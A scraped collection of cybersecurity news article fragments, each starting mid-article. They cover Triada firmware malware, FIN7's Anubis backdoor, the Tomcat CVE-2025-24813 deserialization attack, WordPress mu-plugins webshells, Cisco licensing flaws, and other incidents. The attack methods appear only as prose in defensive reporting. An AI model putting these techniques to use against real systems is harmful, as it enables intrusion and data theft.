Kaspersky detected 2,600+ infections in Russia from March 13-27, 2025.</p>\n\n\n\n<p>The malware was discovered on counterfeit Android devices mimicking popular smartphone models. The researchers speculate that threat actors behind this variant have compromised the supply chain, so stores may not even suspect that they are selling smartphones infected with Triada</p>\n\n\n\n<p>&#8220;The new version of the malware is distributed in the firmware of infected Android devices. It is located in the system framework. This means that a copy of Triada gets into every process on the smartphone.&#8221; reads the <a href=\"https://www.kaspersky.ru/about/press-releases/novaya-versiya-triada-kradyot-kriptovalyutu-akkaunty-v-messendzherah-i-podmenyaet-nomera-telefonov-vo-vremya-zvonkov\">report</a> published by Kaspersky. &#8220;The malware has broad functionality and gives attackers almost unlimited control over the gadget&#8221;</p>\n\n\n\n<p>The malware, embedded in the system framework, provides attackers full control over the device. It can steal accounts, send messages, steal crypto, monitor browsing, intercept SMS, and more.</p>\n\n\n\n<p><em>&#8220;the authors of the new version of Triada are actively monetizing their efforts. Judging by the analysis of transactions, they were able to transfer about $270,000 in various cryptocurrencies*** to their crypto wallets.&#8221; said Dmitry Kalinin, a cybersecurity expert at Kaspersky Lab. &#8220;However, in reality, this amount may be larger; the attackers also targeted Monero, a cryptocurrency that is untraceable.&#8221;</em></p>\n\n\n\n<p>To protect against malware, experts recommend buying smartphones from authorized distributors and installing security solutions like Kaspersky for Android immediately.</p>\n\n\n\n<p>In March 2018, security researchers at Antivirus firm Dr.Web <a href=\"https://securityaffairs.com/69794/malware/smartphone-pre-installed-triada.html\">discovered</a> that 42 models of low-cost Android smartphones were shipped with the <a href=\"http://securityaffairs.co/wordpress/45187/malware/triada-trojan-android-trojan.html\">Android.Triada.231 banking malware</a>.</p>\n\n\n\n<p>The Triada Trojan was spotted for the first time in 2016 by researchers at Kaspersky Lab who considered it the most advanced mobile threat seen to the date of the discovery.</p>\n\n\n\n<p>Triada was designed with the specific intent to implement financial frauds, typically hijacking financial SMS transactions. The most interesting characteristic of the Triada Trojan is its modular architecture, which gives it theoretically a wide range of abilities.</p>\n\n\n\n<p>The Triada Trojan makes use of the Zygote&nbsp;parent process to implement its code in the context of all software on the device, this means that the threat is able to run in each application.</p>\n\n\n\n<p>The only way to remove the threat is to wipe the smartphone and reinstall the OS.</p>\n\n\n\n<p>Researchers at Dr.Web discovered the Triada Trojan pre-installed on newly shipped devices of several minor brands, including Advan, Cherry Mobile, Doogee, and Leagoo.</p>\n\n\n\n<p>In July 2017, Dr..Web researchers discovered <a href=\"http://securityaffairs.co/wordpress/61467/malware/triada-trojan-android-smartphones.html\">many smartphone models were shipped</a> with the dreaded Triada trojan such as Leagoo M5 Plus, Leagoo M8, Nomu S10, and Nomu S20.</p>\n\n\n\n<p>The experts who investigated the issue discovered that a software developer from Shanghai was responsible for the infection.</p>\n\n\n\n<p>Follow me on Twitter:&nbsp;<a href=\"https://twitter.com/securityaffairs\"><strong>@securityaffairs</strong></a>&nbsp;and&nbsp;<a href=\"https://www.facebook.com/sec.affairs\"><strong>Facebook</strong></a>&nbsp;and&nbsp;<a href=\"https://infosec.exchange/@securityaffairs\"><strong>Mastodon</strong></a></p>\n\n\n\n<p><a href=\"http://www.linkedin.com/pub/pierluigi-paganini/b/742/559\"><strong>Pierluigi&nbsp;Paganini</strong></a></p>\n\n\n\n<p><strong>(</strong><a href=\"http://securityaffairs.co/wordpress/\"><strong>SecurityAffairs</strong></a><strong> –</strong> <strong>hacking, malware)</strong></p>",

It executes shell commands and system operations while using obfuscation to evade detection. Delivered via phishing and hosted on compromised SharePoint sites, it remains undetected by most antivirus solutions, posing a serious security risk.</p>\n\n\n\n<p><em>&#8220;The malware is distributed as a ZIP package, which includes a single Python script alongside multiple Python executables. Some variants execute the obfuscated payload immediately after writing it to disk, while others load the payload and call a specific function from it.&#8221; reads the <a href=\"https://catalyst.prodaft.com/public/report/anubis-backdoor/overview\">report</a> published by cybersecurity firm PRODAFT. &#8220;This variability in execution methods demonstrates the malware’s adaptability and the threat actor’s efforts to diversify their delivery mechanisms for different operational scenarios.&#8221;</em></p>\n\n\n\n<p><a href=\"https://securityaffairs.com/123673/cyber-crime/fin7-fake-cybersecurity-firm.html\">FIN7 is a Russian criminal group</a> (aka <a href=\"https://securityaffairs.com/75001/uncategorized/fin7-members-arrested.html\">Carbanak</a>) that has been active since mid-2015, it focuses on restaurants, gambling, and hospitality industries in the US to harvest financial information that was used in attacks or sold in cybercrime marketplaces.</p>\n\n\n\n<p>The researchers noted that a Python script with ~30 lines serves as the main entry point, decrypting and executing the real payload. The backdoor, targeting Windows, uses AES-CBC encryption with base64 encoding and loads the payload via the <code>exec</code> function. Its obfuscation method, replacing variable names with similar characters, resembles tools like PyObfuscate or Anubis Obfuscator, making analysis harder but not highly complex.</p>\n\n\n\n<p>The backdoor communicates via a single TCP socket, switching servers if one fails. Messages, including the groupname, are base64-encoded. Upon execution, it sends the process ID and local IP to the C2 server. To determine the local IP, it creates a UDP socket to 8.8.8.8 on port 80, letting the OS resolve the appropriate address without actual traffic. Each payload contains a groupname and two IPs for communication.</p>\n\n\n\n<p>The backdoor supports multiple commands, including retrieving IP, modifying the registry, executing Python code, and loading DLLs into memory. Remote code execution allows the malware to load malicious functionalities dynamically. The malware supports functionalities like keylogging, file transfers, and registry modifications. It continuously processes commands until termination, using <code>subprocess.Popen</code> for shell execution. </p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://i0.wp.com/securityaffairs.com/wp-content/uploads/2025/04/image-3.png?ssl=1\"><img alt=\"Anubis backdoor\" class=\"wp-image-176137\" height=\"403\" src=\"https://i0.wp.com/securityaffairs.com/wp-content/uploads/2025/04/image-3.png?resize=1024%2C403&#038;ssl=1\" width=\"1024\" /></a></figure>\n\n\n\n<p><em>&#8220;AnubisBackdoor is a stealthy Python-based tool used by Savage Ladybug (FIN7) to maintain access to compromised systems. Despite its mild obfuscation, it remains fully undetected (FUD) by most antivirus solutions. Delivered via malspam campaigns, with compromised SharePoint instances serving the payload, it poses a significant threat to enterprise environments.&#8221; concludes the report. &#8220;Variants of the backdoor execute the payload differently, suggesting ongoing refinement by attackers.&#8221;</em></p>\n\n\n\n<p>Follow me on Twitter:&nbsp;<a href=\"https://twitter.com/securityaffairs\"><strong>@securityaffairs</strong></a>&nbsp;and&nbsp;<a href=\"https://www.facebook.com/sec.affairs\"><strong>Facebook</strong></a>&nbsp;and&nbsp;<a href=\"https://infosec.exchange/@securityaffairs\"><strong>Mastodon</strong></a></p>\n\n\n\n<p><a href=\"http://www.linkedin.com/pub/pierluigi-paganini/b/742/559\"><strong>Pierluigi&nbsp;Paganini</strong></a></p>\n\n\n\n<p><strong>(</strong><a href=\"http://securityaffairs.co/wordpress/\"><strong>SecurityAffairs</strong></a><strong> –</strong> <strong>hacking, Anubis backdoor)</strong></p>",

The vulnerability affects multiple versions including 11.0.0-M1 to 11.0.2, 10.1.0-M1 to 10.1.34, and 9.0.0.M1 to 9.0.98. Exploitation requires write-enabled default servlet, partial PUT support, and specific file handling conditions.</p>\n\n\n\n<p>“The original implementation of partial PUT used a temporary file based on the user provided file name and path with the path separator replaced by “.”.”&nbsp;<a href=\"https://tomcat.apache.org/security-11.html\">reads the advisory</a>.</p>\n\n\n\n<p>“If all of the following were true, a malicious user was able to view security sensitive files and/or inject content into those files:</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li>writes enabled for the default servlet (disabled by default)</li>\n\n\n\n<li>support for partial PUT (enabled by default)</li>\n\n\n\n<li>a target URL for security sensitive uploads that is a sub-directory of a target URL for public uploads</li>\n\n\n\n<li>attacker knowledge of the names of security sensitive files being uploaded</li>\n\n\n\n<li>the security sensitive files also being uploaded via partial PUT</li>\n</ul>\n\n\n\n<p>If all of the following were true, a malicious user was able to perform remote code execution:</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li>writes enabled for the default servlet (disabled by default)</li>\n\n\n\n<li>support for partial PUT (enabled by default)</li>\n\n\n\n<li>application was using Tomcat’s file based session persistence with the default storage location</li>\n\n\n\n<li>application included a library that may be leveraged in a deserialization attack”</li>\n</ul>\n\n\n\n<p>Tomcat versions 9.0.99, 10.1.35, and 11.0&nbsp;<a href=\"https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq\">addressed</a>&nbsp;the vulnerability.</p>\n\n\n\n<p>Wallarm researchers confirmed active exploitation of the flaw and added that attackers can hijack Apache Tomcat servers with a single PUT API request. PoC is online.</p>\n\n\n\n<p><em>“A devastating new remote code execution (RCE) vulnerability,&nbsp;<a href=\"https://github.com/iSee857/CVE-2025-24813-PoC/blob/main/Tomcat_CVE-2025-24813_RCE.py\">CVE-2025-24813</a>, is now actively exploited in the wild. ” reads the&nbsp;<a href=\"https://lab.wallarm.com/one-put-request-to-own-tomcat-cve-2025-24813-rce-is-in-the-wild/\">advisory</a>&nbsp;published by Wallarm. “Attackers need just one PUT API request to take over vulnerable Apache Tomcat servers. The exploit, originally published by a Chinese forum user iSee857, is already available online: CVE-2025-24813 PoC by iSee857.”</em></p>\n\n\n\n<p>The attack exploits Tomcat’s session persistence and partial PUT requests by uploading a malicious Java session file and triggering deserialization via a GET request.</p>\n\n\n\n<p>The attack involves two steps:</p>\n\n\n\n<ol class=\"wp-block-list\">\n<li><strong>Uploading a Malicious Serialized Session</strong> – The attacker sends a PUT request containing a base64-encoded ysoserial gadget chain, storing it in Tomcat’s session directory.</li>\n\n\n\n<li><strong>Triggering Execution via Session Cookie</strong> – A GET request with the JSESSIONID referencing the malicious session forces Tomcat to deserialize and execute the payload, granting remote access.</li>\n</ol>\n\n\n\n<p><em>“This attack is dead simple to execute and requires no authentication. The only requirement is that Tomcat is using file-based session storage, which is common in many deployments.” concludes the advisory. “Worse, base64 encoding allows the exploit to bypass most traditional security filters, making detection challenging.”</em></p>\n\n\n\n<p>Wallarm researchers warn that most Web Application Firewalls (WAFs) fail to detect this attack because the PUT request appears normal and lacks obvious malicious content. The payload is base64-encoded, evading pattern-based detection, and the attack occurs in two steps, with execution happening only during deserialization. Additionally, most WAFs do not thoroughly inspect uploaded files or track multi-step exploits. As a result, by the time organizations notice the breach in their logs, it is already too late.</p>\n\n\n\n<p>Users are recommended to update their affected Tomcat versions immediately to mitigate potential threats.</p>\n\n\n\n<p>According to&nbsp;<a href=\"https://cyber.dhs.gov/bod/22-01/\" rel=\"noreferrer noopener\" target=\"_blank\">Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities</a>, FCEB agencies have to address the identified vulnerabilities by the due date to protect their networks against attacks exploiting the flaws in the catalog.</p>\n\n\n\n<p>Experts also recommend private organizations review the&nbsp;<a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" rel=\"noreferrer noopener\" target=\"_blank\">Catalog</a>&nbsp;and address the vulnerabilities in their infrastructure.</p>\n\n\n\n<p>CISA orders federal agencies to fix this vulnerability by April 22, 2025.</p>\n\n\n\n<p>Follow me on Twitter:&nbsp;<a href=\"https://twitter.com/securityaffairs\"><strong>@securityaffairs</strong></a>&nbsp;and&nbsp;<a href=\"https://www.facebook.com/sec.affairs\"><strong>Facebook</strong></a>&nbsp;and&nbsp;<a href=\"https://infosec.exchange/@securityaffairs\"><strong>Mastodon</strong></a></p>\n\n\n\n<p><a href=\"http://www.linkedin.com/pub/pierluigi-paganini/b/742/559\"><strong>Pierluigi&nbsp;Paganini</strong></a></p>\n\n\n\n<p><strong>(</strong><a href=\"http://securityaffairs.co/wordpress/\"><strong>SecurityAffairs</strong></a><strong> –</strong> <strong>hacking, CISA)</strong></p>",

From March 17 to 26, activity surged with nearly 20,000 IPs scanning logins daily. GreyNoise identified around 23,000 suspicious IPs and 150 known malicious ones, suggesting a potential targeted attack.</p>\n\n\n\n<p><em>&#8220;GreyNoise has observed a significant surge in login scanning activity targeting Palo Alto Networks PAN-OS GlobalProtect portals. Over the last 30 days, nearly 24,000 unique IP addresses have attempted to access these portals.&#8221; reads the <a href=\"https://www.greynoise.io/blog/surge-palo-alto-networks-scanner-activity\"><strong>report</strong></a> published by GreyNoise. &#8220;The pattern suggests a coordinated effort to probe network defenses and identify exposed or vulnerable systems, potentially as a precursor to targeted exploitation.&#8221;</em></p>\n\n\n\n<p>The experts believe that this activity is part of a reconnaissance effort to test network defenses, potentially paving the way for future attacks. GreyNoise recommends that organizations using Palo Alto Networks products should take steps to secure their login portals. </p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://i0.wp.com/securityaffairs.com/wp-content/uploads/2025/04/image-2.png?ssl=1\"><img alt=\"Palo Alto Networks attacks\" class=\"wp-image-176109\" height=\"522\" src=\"https://i0.wp.com/securityaffairs.com/wp-content/uploads/2025/04/image-2.png?resize=1024%2C522&#038;ssl=1\" width=\"1024\" /></a></figure>\n\n\n\n<p>A large portion of traffic is linked to 3xK Tech GmbH (20,010 IPs) under ASN200373, with contributions from PureVoltage Hosting Inc., Fast Servers Pty Ltd., and Oy Crea Nova Hosting. GreyNoise identified three JA4h hashes related to a login scanner tool. The activity originates mainly from the U.S. (16,249 IPs) and Canada (5,823 IPs), targeting primarily the U.S. (23,768), followed by the U.K., Ireland, Russia, and Singapore.</p>\n\n\n\n<p>The researchers also observed scans that are targeting GlobalProtect portals and other PAN-OS appliances like PAN-OS Crawler, similar to threats <a href=\"https://blog.talosintelligence.com/arcanedoor-new-espionage-focused-campaign-found-targeting-perimeter-network-devices/\">identified</a> by Cisco Talos in April last year, which targeted Cisco appliances, Microsoft Exchange servers, and edge devices from various vendors.</p>\n\n\n\n<p><em>“Given the unusual nature of this activity, organizations with exposed Palo Alto Networks systems should review their March logs and <strong>consider performing a detailed threat hunt on running systems to identify any signs of compromise.</strong>” GreyNoise concludes.</em></p>\n\n\n\n<p>Follow me on Twitter:&nbsp;<a href=\"https://twitter.com/securityaffairs\"><strong>@securityaffairs</strong></a>&nbsp;and&nbsp;<a href=\"https://www.facebook.com/sec.affairs\"><strong>Facebook</strong></a>&nbsp;and&nbsp;<a href=\"https://infosec.exchange/@securityaffairs\"><strong>Mastodon</strong></a></p>\n\n\n\n<p><a href=\"http://www.linkedin.com/pub/pierluigi-paganini/b/742/559\"><strong>Pierluigi&nbsp;Paganini</strong></a></p>\n\n\n\n<p><strong>(</strong><a href=\"http://securityaffairs.co/wordpress/\"><strong>SecurityAffairs</strong></a><strong> –</strong> <strong>hacking, GreyNoise)</strong></p>",

It allows advertisers to track user activity across apps and websites for targeted advertising while maintaining user anonymity. Users can reset or disable IDFA through privacy settings.</p>\n\n\n\n<p>France&#8217;s Autorité found Apple&#8217;s ATT framework, while not inherently problematic, was implemented in a way that was unnecessary and disproportionate. Apple&#8217;s ATT framework caused excessive pop-ups, complicating third-party app use. It lacked neutrality and harmed smaller publishers reliant on third-party data, leading to economic disadvantages for app developers and ad service providers.</p>\n\n\n\n<p><em>&#8220;As part of its investigation into the merits of the case, the Autorité found that while the objective of the App Tracking Transparency (“ATT”) framework is not at its core problematic, how ATT is implemented is neither necessary for nor proportionate with Apple’s stated objective of protecting personal data.&#8221; reads the <a href=\"https://www.autoritedelaconcurrence.fr/en/press-release/targeted-advertising-autorite-de-la-concurrence-imposes-fine-eu150000000-apple\"><strong>report</strong></a> published by France&#8217;s Autorité de la concurrence.</em></p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large is-resized\"><a href=\"https://i0.wp.com/securityaffairs.com/wp-content/uploads/2025/04/image.png?ssl=1\"><img alt=\"France's Autorité de la concurrence fined Apple\" class=\"wp-image-176094\" height=\"728\" src=\"https://i0.wp.com/securityaffairs.com/wp-content/uploads/2025/04/image.png?resize=1024%2C728&#038;ssl=1\" style=\"width: 604px; height: auto;\" width=\"1024\" /></a></figure></div>\n\n\n<p></p>\n\n\n\n<p>Apple&#8217;s ATT framework, though intended for privacy, was found to unfairly disadvantage third-party apps by making their use overly complex and favoring Apple&#8217;s own services. The Autorité ruled that ATT’s implementation distorted competition, harming smaller publishers reliant on ad revenue. Apple also imposed stricter consent rules on others while benefiting from a simpler process for its own data collection. The framework’s asymmetry, where Apple required double consent from third-party apps but not itself, led to regulatory penalties. The Autorité considered these rules unnecessary, as they harmed competition and made third-party apps more difficult to use without valid reasoning.</p>\n\n\n\n<p>The head of the French Competition Authority dismissed worries that the decision would prompt retaliation from U.S. President Donald Trump who has threatened to slap fines on EU countries fining U.S. companies.</p>\n\n\n\n<p><em>&#8220;We apply competition law in an apolitical manner,&#8221; Benoit Coeure, the head of the French Competition Authority, <a href=\"https://www.reuters.com/technology/french-antitrust-regulator-fines-apple-150-million-euros-over-privacy-tool-2025-03-31/\">told a press conference</a>. &#8220;But what we have heard &#8230; is that they (U.S. authorities) intend to apply antitrust law to the big digital platforms as strictly as their predecessors. So in terms of antitrust, I don&#8217;t see any controversy between the United States and Europe on how we apply the law,&#8221; he added.</em></p>\n\n\n\n<p>Apple expressed disappointment with the decision, noting that the French Competition Authority did not mandate any specific changes to the App Tracking Transparency (ATT) framework.</p>\n\n\n\n<p><em>&#8220;While we are disappointed with today&#8217;s decision, the French Competition Authority has not required any specific changes to ATT,&#8221; reads a <a href=\"https://www.reuters.com/technology/french-antitrust-regulator-fines-apple-150-million-euros-over-privacy-tool-2025-03-31/\">statement</a> issued by the IT giant.</em></p>\n\n\n\n<p>Follow me on Twitter:&nbsp;<a href=\"https://twitter.com/securityaffairs\"><strong>@securityaffairs</strong></a>&nbsp;and&nbsp;<a href=\"https://www.facebook.com/sec.affairs\"><strong>Facebook</strong></a>&nbsp;and&nbsp;<a href=\"https://infosec.exchange/@securityaffairs\"><strong>Mastodon</strong></a></p>\n\n\n\n<p><a href=\"http://www.linkedin.com/pub/pierluigi-paganini/b/742/559\"><strong>Pierluigi&nbsp;Paganini</strong></a></p>\n\n\n\n<p><strong>(</strong><a href=\"http://securityaffairs.co/wordpress/\"><strong>SecurityAffairs</strong></a><strong> –</strong> <strong>hacking, Ukraine)</strong></p>",

Attackers exploit this directory to maintain persistence and evade detection, as files placed here execute automatically and are not easily disabled from the WordPress admin panel.&#8221; <a href=\"https://blog.sucuri.net/2025/02/hidden-backdoors-uncovered-in-wordpress-malware-investigation.html\">states</a> Sucuri. &#8220;This makes it an ideal location for backdoors, allowing attackers to execute malicious code stealthily.&#8221;</em></p>\n\n\n\n<p>Attackers used obfuscated PHP in mu-plugins to execute hidden payloads from <code>/wp-content/uploads/2024/12/index.txt</code>, using the functions <code>eval()</code> to run arbitrary code stealthily.</p>\n\n\n\n<p>The script constructs a URL, sends requests to an external server, fetches content via <code>file_get_contents()</code> or cURL, modifies <code>robots.txt</code>, checks response markers, and pings sitemaps. The researchers noted that the script can manipulate website behavior, evade detection, and facilitate redirections.</p>\n\n\n\n<p>The experts detailed two cases of malware hiding in the mu-plugins directory, which use different methods to compromise WordPress sites.</p>\n\n\n\n<p>Malware in the mu-plugins directory includes a fake update redirect (<code>redirect.php</code>), a webshell (<code>index.php</code>) for full site control, and a spam injector (<code>custom-js-loader.php</code>). These malware allow attackers to redirect users, execute arbitrary code, and inject spam, aligning with past findings on hidden backdoors in WordPress sites.</p>\n\n\n\n<p><em>&#8220;The presence of this malware can be identified by most obvious signs. One prominent indicator is unusual behavior on the site, such as unauthorized redirections of users to external malicious websites. Additionally, suspicious files with uncommon or misleading names appear within the <strong>mu-plugins</strong> directory, often mimicking legitimate plugins.&#8221; reads the <a href=\"https://blog.sucuri.net/2025/03/hidden-malware-strikes-again-mu-plugins-under-attack.html\"><strong>report</strong></a> published by Sucuri. &#8220;Website administrators may also notice elevated server resource usage with no clear explanation, along with unexpected file modifications or the inclusion of unauthorized code in critical directories.&#8221;</em></p>\n\n\n\n<p>Attackers increasingly target the mu-plugins directory for persistence, as it auto-loads plugins without activation. This allows them to redirect traffic, maintain backdoor access, and inject spam for SEO manipulation, making it hard to detect and remove.</p>\n\n\n\n<p>The first malware analyzed by Sucuri is a fake update redirection malware in <code>redirect.php</code> that selectively redirects visitors to a malicious site while avoiding bots and admins to evade detection. Disguised as a WordPress function, it tricks users into executing malicious code, leading to data theft, backdoors, and further infections, compromising site security.</p>\n\n\n\n<p>The second malware is a Remote Code Execution Webshell. A sophisticated attack in <code>index.php</code> disguises itself as a plugin, using cURL to fetch and execute a remote PHP script. This allows attackers to inject new malware dynamically without altering the file, enabling persistent control and ongoing infections.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://i0.wp.com/securityaffairs.com/wp-content/uploads/2025/03/image-61.png?ssl=1\"><img alt=\"WordPress malware in the mu-plugins directory\" class=\"wp-image-176085\" height=\"875\" src=\"https://i0.wp.com/securityaffairs.com/wp-content/uploads/2025/03/image-61.png?resize=1024%2C875&#038;ssl=1\" width=\"1024\" /></a></figure>\n\n\n\n<p>The third malware detected by Sucurity is a JavaScript injector in <code>custom-js-loader.php</code> that replaces site images with explicit content and hijacks links to open malicious popups. It ensures persistence in the mu-plugins folder, harming the site&#8217;s reputation and user experience while manipulating traffic for malicious purposes.</p>\n\n\n\n<p>The infections discovered by the researchers aim for monetization and persistence. Redirect malware harms reputation and traffic, the webshell enables full site takeover and data theft, and spam injection replaces images with explicit content while hijacking links. Impacts range from SEO spam to severe security breaches, stressing the need for strong security.</p>\n\n\n\n<p>Attackers may have deployed the malware through vulnerable plugins/themes, compromised admin credentials, or poorly secured hosting, allowing attackers to upload and execute malicious files.</p>\n\n\n\n<p>&#8220;The repeated abuse of the <strong>mu-plugins</strong> directory highlights the creativity and persistence of attackers in hiding malware deep within WordPress installations.&#8221; concludes the report. &#8220;Regular security monitoring, file integrity checks, and web application firewalls (WAFs) are essential in keeping such infections at bay.&#8221;</p>\n\n\n\n<p>Follow me on Twitter:&nbsp;<a href=\"https://twitter.com/securityaffairs\"><strong>@securityaffairs</strong></a>&nbsp;and&nbsp;<a href=\"https://www.facebook.com/sec.affairs\"><strong>Facebook</strong></a>&nbsp;and&nbsp;<a href=\"https://infosec.exchange/@securityaffairs\"><strong>Mastodon</strong></a></p>\n\n\n\n<p><a href=\"http://www.linkedin.com/pub/pierluigi-paganini/b/742/559\"><strong>Pierluigi&nbsp;Paganini</strong></a></p>\n\n\n\n<p><strong>(</strong><a href=\"http://securityaffairs.co/wordpress/\"><strong>SecurityAffairs</strong></a><strong> –</strong> <strong>hacking, mu-plugins)</strong></p>",

Attackers can exploit the backdoor to access sensitive log files. While no active exploitation was initially observed, the publication of exploit details has led to recent attack activity.</p>\n\n\n\n<p><em>“Multiple vulnerabilities in Cisco Smart Licensing Utility could allow an unauthenticated, remote attacker to collect sensitive information or administer Cisco Smart Licensing Utility services on a system while the software is running.”&nbsp;<a href=\"https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cslu-7gHMzWmw\">reads the advisory</a>.</em></p>\n\n\n\n<p>Below are the descriptions of the two vulnerabilities:</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li><strong>CVE-2024-20439</strong> (CVSS score: 9.8) – The flaw is related to the presence of an undocumented static admin credential, allowing attackers to log in with administrative privileges via the Cisco Smart Licensing Utility API.</li>\n\n\n\n<li><strong>CVE-2024-20440</strong> (CVSS score: 9.8) – The vulnerability is due to excessive verbosity in a debug log file. An attacker could exploit this issue by sending a specially crafted HTTP request to an affected device and obtain log files that contain sensitive data, including credentials that can be used to access the API.</li>\n</ul>\n\n\n\n<p>The IT giant also released software updates that address these flaws. There are no workarounds to address the two issues.</p>\n\n\n\n<p>Researchers at SANS Internet Storm Center warned that the two issues are actively exploited in attacks.</p>\n\n\n\n<p><em>“These two vulnerabilities are somewhat connected. The first one is one of the many backdoors Cisco likes to equip its products with. A simple fixed password that can be used to obtain access. The second one is a log file that logs more than it should. Using the first vulnerability, an attacker may access the log file.” reads the&nbsp;<a href=\"https://isc.sans.edu/diary/rss/31782\">advisory</a>&nbsp;published by SANS. “A quick search didn’t show any active exploitation, but details, including the backdoor credentials, were published in a blog by Nicholas Starke shortly after Cisco released its advisory [2]. So it is no surprise that we are seeing some exploit activity”</em></p>\n\n\n\n<p>SANS researchers warned that the group attempting to exploit the two vulnerabilities is also targeting configuration files and possibly <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-0305\" rel=\"noreferrer noopener\" target=\"_blank\">CVE-2024-0305</a> (CVSS score: 5.3), likely exploiting a DVR vulnerability.</p>\n\n\n\n<p>SANS’s advisory does not provide information about the identity or motivation of the attackers exploiting the two flaws.</p>\n\n\n\n<p>According to&nbsp;<a href=\"https://cyber.dhs.gov/bod/22-01/\" rel=\"noreferrer noopener\" target=\"_blank\">Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities</a>, FCEB agencies have to address the identified vulnerabilities by the due date to protect their networks against attacks exploiting the flaws in the catalog.</p>\n\n\n\n<p>Experts also recommend private organizations review the&nbsp;<a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" rel=\"noreferrer noopener\" target=\"_blank\">Catalog</a>&nbsp;and address the vulnerabilities in their infrastructure.</p>\n\n\n\n<p>CISA orders federal agencies to fix this vulnerability by April 21, 2025.</p>\n\n\n\n<p>Follow me on Twitter:&nbsp;<a href=\"https://twitter.com/securityaffairs\"><strong>@securityaffairs</strong></a>&nbsp;and&nbsp;<a href=\"https://www.facebook.com/sec.affairs\"><strong>Facebook</strong></a>&nbsp;and&nbsp;<a href=\"https://infosec.exchange/@securityaffairs\"><strong>Mastodon</strong></a></p>\n\n\n\n<p><a href=\"http://www.linkedin.com/pub/pierluigi-paganini/b/742/559\"><strong>Pierluigi&nbsp;Paganini</strong></a></p>\n\n\n\n<p><strong>(</strong><a href=\"http://securityaffairs.co/wordpress/\"><strong>SecurityAffairs</strong></a><strong> –</strong> <strong>hacking, Cisco Smart Licensing Utility vulnerability)</strong></p>",

That exposed information included names, home addresses, email addresses, phone numbers and social security numbers for a total of 2,501,324 student loan account holders. Users’ financial information was not exposed.\nAccording to a breach disclosure filing submitted by Nelnet’s general counsel, Bill Munn, to the state of Maine the breach occurred sometime between June 1, 2022 and July 22, 2022. However, a letter to affected customers pinpoints the breach to July 21. The breach was discovered on August 17, 2022.\n“On July 21, 2022, Nelnet Servicing, LLC (Nelnet), our servicing system and customer website\nportal provider, notified us that they had discovered a vulnerability that we believe led to this incident,” according to the Nelnet.\nIt’s unclear what the vulnerability was.\n“On August 17, 2022, this investigation determined that certain student loan account registration information was accessible by an unknown party beginning in June 2022 and ending on July 22, 2022,” according to the letter.\nLoan Recipient Targets\nAlthough users’ most sensitive financial data was protected, the personal information that was accessed in the Nelnet breach “has potential to be leveraged in future social engineering and phishing campaigns,” explained Melissa Bischoping, endpoint security research specialist at Tanium, in a statement via email.\n“With recent news of student loan forgiveness, it’s reasonable to expect the occasion to be used by scammers as a gateway for criminal activity,” Bischoping said.\nLast week, the Biden administration announced a\nplan\nto cancel $10,000 of student loan debt for low- and middle-income loanees. She said the loan forgiveness program will be used to lure victims into opening up phishing emails.\nShe warns that recently breached data will be used to impersonate affected brands in waves of phishing campaigns targeting students and recent college graduates.\n“Because they can leverage the trust from existing business relationships they can be particularly deceptive,” she wrote.\nAccording to the breach disclosure Nelnet Servicing informed Edfinancial and OSLA that Nelnet Servicing’s cybersecurity team “took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched an investigation with third-party forensic experts to determine the nature and scope of the activity.”\nRemediation also included two years of free credit monitoring, credit reports and up to $1 million in identity theft insurance.\nShare this article:\nBreach",

        "content": "Watering Hole Attacks Push ScanBox Keylogger\nAuthor:\nNate Nelson\nAugust 30, 2022\n12:00 pm\nminute read\nShare this article:\nResearchers uncover a watering hole attack likely carried out by APT TA423, which attempts to plant the ScanBox JavaScript-based reconnaissance tool.\nA China-based threat actor has ramped up efforts to distribute the ScanBox reconnaissance framework to victims that include domestic Australian organizations and offshore energy firms in the South China Sea. The bait used by the advanced threat group (APT) is targeted messages that supposedly link back to Australian news websites.\nThe cyber-espionage campaigns are believed to have launched April 2022 through mid-June 2022, according to a\nTuesday report\nby Proofpoint’s Threat Research Team and PwC’s Threat Intelligence team.\nThe threat actor, according to researchers, is believed to be the China-based APT TA423, also known as Red Ladon. “Proofpoint assesses with moderate confidence that this activity may be attributable to the threat actor TA423 / Red Ladon, which\nmultiple\nreports\nassess\nto operate out of Hainan Island, China,” according to the report.\nThe APT is most recently known for a recent indictment. “A 2021 indictment by the US Department of Justice assessed that TA423 / Red Ladon provides long-running support to the Hainan Province Ministry of State Security (MSS),” researchers said.\nMSS is the civilian intelligence, security and cyber police agency for the People’s Republic of China. It is believed responsible for counter-intelligence, foreign intelligence, political security and tied to industrial and cyber espionage efforts by China.\nDusting Off the ScanBox\nThe campaign leverages the ScanBox framework. ScanBox is a customizable and multifunctional Javascript-based framework used by adversaries to conducting covert reconnaissance.\nScanBox has been used by adversaries for nearly a decade and is noteworthy because criminals can use the tool to conduct counter intelligence without having to plant malware on a targets system.\n“ScanBox is particularly dangerous as it doesn’t require malware to be successfully deployed to disk in order to steal information – the keylogging functionality simply requires the JavaScript code to be executed by a web browser,” according to PwC researchers\nreferring to a previous campaign\n.\nIn lieu of malware, attackers can use ScanBox in conjunction with watering hole attacks. Adversaries load the malicious JavaScript onto a compromised website where the ScanBox acts as a keylogger snagging all of a user’s typed activity on the infected watering hole website.\nTA423’s attacks began with phishing emails, with such titles as “Sick Leave,” “User Research” and “Request Cooperation.” Often, the emails purported to come from an employee of the “Australian Morning News,” a fictional organization. The employee implored targets to visit their “humble news website,” australianmorningnews[.]com.\n“Upon clicking the link and redirecting to the site, visitors were served the ScanBox framework,” researchers wrote.\nThe link directed targets to a web page with content copied from actual news sites, like the BBC and Sky News. In the process, it also delivered the ScanBox malware framework.\nScanBox keylogger data culled from waterholes is part of a multi-stage attack, giving attackers insight into the potential targets that will help them launch future attacks against 